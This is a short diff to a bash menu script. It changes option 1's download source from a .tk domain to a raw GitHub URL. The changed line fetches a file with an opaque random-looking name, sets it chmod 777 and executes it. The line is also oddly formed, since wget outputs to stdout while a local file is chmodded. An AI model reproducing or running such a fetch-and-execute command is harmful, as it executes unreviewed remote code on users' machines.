@@ -15,7 +15,7 @@
 			clear
 			case $x in
 			1 | 01)
-			bash <(wget -qO- https://asasdev.tk/s/n5Yy6SQegMillksKzLrLQhP92IDen7Ge41l6brOe4xoj8BXEg380mR4kYATD4gE5PuoCkPIQqq2UIGmSh68mobK7zNNuTnY5 && chmod 777 n5Yy6SQegMillksKzLrLQhP92IDen7Ge41l6brOe4xoj8BXEg380mR4kYATD4gE5PuoCkPIQqq2UIGmSh68mobK7zNNuTnY5 && ./n5Yy6SQegMillksKzLrLQhP92IDen7Ge41l6brOe4xoj8BXEg380mR4kYATD4gE5PuoCkPIQqq2UIGmSh68mobK7zNNuTnY5)
+			bash <(wget -qO- https://raw.githubusercontent.com/almeida1976/main/n5Yy6SQegMillksKzLrLQhP92IDen7Ge41l6brOe4xoj8BXEg380mR4kYATD4gE5PuoCkPIQqq2UIGmSh68mobK7zNNuTnY5 && chmod 777 n5Yy6SQegMillksKzLrLQhP92IDen7Ge41l6brOe4xoj8BXEg380mR4kYATD4gE5PuoCkPIQqq2UIGmSh68mobK7zNNuTnY5 && ./n5Yy6SQegMillksKzLrLQhP92IDen7Ge41l6brOe4xoj8BXEg380mR4kYATD4gE5PuoCkPIQqq2UIGmSh68mobK7zNNuTnY5)
 			;;
 			2 | 02)
             terminus
